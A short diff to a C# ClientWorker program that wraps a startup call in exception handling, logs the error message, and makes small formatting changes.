@@ -19,8 +19,16 @@ namespace ClientWorker
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-            if (args.Length > 0 ) downloadSource = args[0];
-            OnProgramLoad();
+            if (args.Length > 0 ) 
+                downloadSource = args[0];
+
+            try
+            {
+                OnProgramLoad();
+            }catch(Exception ex)
+            {
+                Log.Send(ex.Message);
+            }
 
             Client netSender = new Client();
             //netSender.Host = "localhost";
@@ -59,6 +67,7 @@ namespace ClientWorker
             Functions.Registration();
             FtpClient.Init();
         }
+
         private static string GetProcessName()
         {
             string result = "";
@@ -75,6 +84,7 @@ namespace ClientWorker
 
             return result;
         }
+
         private static bool CheckOtherWorkerAndMiner()
         {
             bool result = false;
